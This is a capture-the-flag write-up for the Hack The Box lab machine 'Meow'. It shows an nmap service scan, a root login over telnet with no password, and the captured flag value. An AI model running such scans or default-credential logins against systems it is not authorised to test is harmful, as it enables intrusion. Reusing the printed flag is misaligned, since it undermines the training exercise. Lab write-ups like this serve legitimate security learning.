# Hack The Box Machines: Meow

First of all, I'll make a service detection on the target machine with **nmap** using the **-sV** flag.
```sh
❯ target=10.129.179.81
❯ nmap -sV $target
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-13 11:49 CEST
Nmap scan report for 10.129.179.81
Host is up (0.070s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
```

As it can be seen, the TCP port 23 is open with a telnet service running on it. The version uses telnetd from linux.

So, let's try connect to the target machine using the tool **telnet** from linux. 

```sh
❯ telnet $target
Trying 10.129.179.81...
Connected to 10.129.179.81.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
root@Meow:~#
```

As seen, the target machine asks for login user, in this case let's try a common user login **root**. And as we can see it's a correct login. Now let's find the flag.

```sh
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

Finally the flag found it is **b40abdfe23665f766f9c61ecba8a4c19**.
